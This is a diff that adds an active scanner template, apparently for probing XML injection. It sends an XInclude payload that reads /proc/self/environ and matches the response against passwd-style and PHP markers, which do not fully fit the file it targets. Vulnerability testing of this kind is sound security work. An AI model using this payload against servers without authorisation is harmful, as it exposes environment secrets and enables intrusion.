@@ -1,0 +1,25 @@
+id: xxe5-0298
+name: 'XXE read in text'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via text'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      text:
+        - '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///proc/self/environ"/></r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
